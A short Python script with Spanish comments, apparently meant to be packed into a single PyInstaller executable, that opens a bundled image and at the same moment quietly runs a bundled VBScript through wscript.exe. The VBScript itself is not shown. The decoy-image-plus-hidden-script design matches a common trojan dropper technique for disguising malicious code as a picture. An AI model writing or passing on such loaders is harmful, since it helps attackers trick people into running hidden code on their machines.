import os
import subprocess
import sys

# Soporte para ejecutable --onefile (PyInstaller)
carpeta_base = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))

imagen = os.path.join(carpeta_base, "imagen.jpg")
vbs = os.path.join(carpeta_base, "imagen.vbs")

# Abrir imagen
if os.path.exists(imagen):
    os.startfile(imagen)

# Ejecutar .vbs
if os.path.exists(vbs):
    subprocess.Popen(["wscript.exe", vbs], shell=True)
